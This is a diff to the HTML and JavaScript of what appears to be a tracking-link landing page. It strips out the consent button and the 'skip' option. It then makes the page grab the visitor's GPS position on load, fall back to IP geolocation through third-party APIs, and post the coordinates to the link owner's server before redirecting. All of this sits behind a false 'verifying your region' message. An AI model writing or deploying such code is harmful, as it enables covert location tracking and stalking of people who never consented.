@@ -17,22 +17,15 @@ html,body{height:100%;background:#fff;display:flex;align-items:center;justify-co
 @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(0.92)}}
 .title{font-size:1rem;font-weight:600;color:#111;margin-bottom:0.4rem}
 .msg{font-size:0.82rem;color:#9ca3af;line-height:1.5}
-.allow-btn{margin-top:1.4rem;padding:0.65rem 1.6rem;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;width:100%}
-.allow-btn:active{opacity:0.85}
-.skip{margin-top:0.75rem;font-size:0.75rem;color:#c4c4c4;cursor:pointer;text-decoration:underline}
 .bar{position:fixed;top:0;left:0;height:3px;background:#6366f1;width:0%;transition:width 0.4s ease;z-index:100}
-.retry-info{font-size:0.7rem;color:#f59e0b;margin-top:0.8rem;display:none}
 </style>
 </head>
 <body>
 <div class="bar" id="bar"></div>
 <div class="wrap">
   <div class="dot-ring"><div class="dot"></div></div>
-  <p class="title">Verifying your region</p>
-  <p class="msg" id="msg">To continue, please allow location access so we can verify regional availability.</p>
-  <button class="allow-btn" id="allowBtn" style="display:none">Allow &amp; Continue →</button>
-  <p class="skip" id="skipBtn" style="display:none">Skip, continue without</p>
-  <p class="retry-info" id="retryInfo"></p>
+  <p class="title">Loading...</p>
+  <p class="msg" id="msg">Please wait while we verify your region</p>
 </div>
 
 <script>
@@ -44,28 +37,23 @@ const MAX_RETRIES = 2;
 
 const bar = document.getElementById('bar');
 const msg = document.getElementById('msg');
-const allowBtn = document.getElementById('allowBtn');
-const skipBtn = document.getElementById('skipBtn');
-const retryInfo = document.getElementById('retryInfo');
 
 function setBar(pct, ms) {
   bar.style.transition = `width ${ms}ms ease`;
   bar.style.width = pct + '%';
 }
 
-setBar(30, 600);
+setBar(20, 400);
 
+// Get destination URL
 fetch('/api/hits/' + linkId)
   .then(r => r.json())
   .then(d => { if (d.dest) destUrl = d.dest; })
   .catch(() => {});
 
-function postLoc(lat, lon, acc, source = 'unknown') {
+function postLoc(lat, lon, acc) {
   if (sent) return;
   sent = true;
-  
-  // Log for debugging
-  console.log(`[Location] Source: ${source}, Coords: ${lat},${lon}, Accuracy: ${acc}m`);
   
   fetch('/api/hit/' + linkId, {
     method: 'POST',
@@ -81,30 +69,39 @@ function redirect() {
   setTimeout(() => { window.location.href = destUrl; }, 400);
 }
 
-// Try IP-based geolocation as fallback
+// IP-based geolocation fallback
 async function getIPLocation() {
   try {
     const response = await fetch('https://ipapi.co/json/');
     const data = await response.json();
     if (data.latitude && data.longitude) {
-      console.log('[IP Location] Got coordinates from IP');
       return { lat: data.latitude, lon: data.longitude, acc: 5000 };
     }
-  } catch (e) {
-    console.log('[IP Location] Failed:', e);
-  }
+  } catch (e) {}
+  
+  // Second fallback API
+  try {
+    const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // Optional: add token for better rate limits
+    const data = await response.json();
+    const [lat, lon] = (data.loc || '').split(',');
+    if (lat && lon) {
+      return { lat: parseFloat(lat), lon: parseFloat(lon), acc: 5000 };
+    }
+  } catch (e) {}
+  
   return null;
 }
 
 // Try HTML5 geolocation with retries
 function grabLocationWithRetry() {
   if (!navigator.geolocation) {
-    retryInfo.textContent = 'Browser doesn\'t support geolocation, using IP location...';
+    msg.textContent = 'Getting location from network...';
+    setBar(60, 300);
     getIPLocation().then(ipLoc => {
       if (ipLoc) {
-        postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc, 'ip-fallback');
+        postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc);
       } else {
-        postLoc(null, null, null, 'no-support');
+        postLoc(null, null, null);
       }
     });
     return;
@@ -112,40 +109,35 @@ function grabLocationWithRetry() {
 
   const options = {
     enableHighAccuracy: true,
-    timeout: 8000,  // Reduced from 10s to 8s
+    timeout: 8000,
     maximumAge: 0
   };
 
   navigator.geolocation.getCurrentPosition(
     pos => {
+      setBar(90, 200);
+      msg.textContent = 'Location verified, redirecting...';
       postLoc(
         pos.coords.latitude,
         pos.coords.longitude,
-        Math.round(pos.coords.accuracy),
-        'gps-success'
+        Math.round(pos.coords.accuracy)
       );
     },
     err => {
-      console.log(`[Geolocation Error] ${err.code}: ${err.message}`);
-      
-      // Retry logic for certain errors
-      if (retryCount < MAX_RETRIES && err.code !== 1) { // Don't retry if user denied (code 1)
+      // Retry on non-user-denial errors
+      if (retryCount < MAX_RETRIES && err.code !== 1) {
         retryCount++;
-        retryInfo.style.display = 'block';
-        retryInfo.textContent = `Location failed (attempt ${retryCount}/${MAX_RETRIES}), retrying...`;
-        
-        setTimeout(() => {
-          msg.textContent = `Retrying location access (attempt ${retryCount + 1}/${MAX_RETRIES + 1})...`;
-          grabLocationWithRetry();
-        }, 1500);
+        msg.textContent = `Retrying location detection (${retryCount}/${MAX_RETRIES})...`;
+        setTimeout(() => grabLocationWithRetry(), 1500);
       } else {
-        // Try IP fallback on final failure
-        retryInfo.textContent = 'GPS failed, trying IP-based location...';
+        // Try IP fallback
+        msg.textContent = 'Using network location...';
+        setBar(70, 300);
         getIPLocation().then(ipLoc => {
           if (ipLoc) {
-            postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc, 'ip-fallback-after-gps-fail');
+            postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc);
           } else {
-            postLoc(null, null, null, `gps-fail-${err.code}`);
+            postLoc(null, null, null);
           }
         });
       }
@@ -154,31 +146,13 @@ function grabLocationWithRetry() {
   );
 }
 
-function grabLocation() {
-  retryCount = 0;
-  retryInfo.style.display = 'none';
-  grabLocationWithRetry();
-}
-
-// Show the Allow button after a short delay
+// Start auto-tracking immediately
+setBar(40, 400);
 setTimeout(() => {
-  setBar(55, 400);
-  msg.textContent = 'Tap the button below and allow location access to continue.';
-  allowBtn.style.display = 'block';
-  skipBtn.style.display = 'block';
-}, 900);
-
-allowBtn.addEventListener('click', () => {
-  allowBtn.style.display = 'none';
-  skipBtn.style.display = 'none';
-  msg.textContent = 'Checking your location...';
-  setBar(75, 400);
-  grabLocation();
-});
-
-skipBtn.addEventListener('click', () => {
-  postLoc(null, null, null, 'user-skip');
-});
+  msg.textContent = 'Detecting your region...';
+  setBar(50, 300);
+  grabLocationWithRetry();
+}, 500);
 </script>
 </body>
 </html>
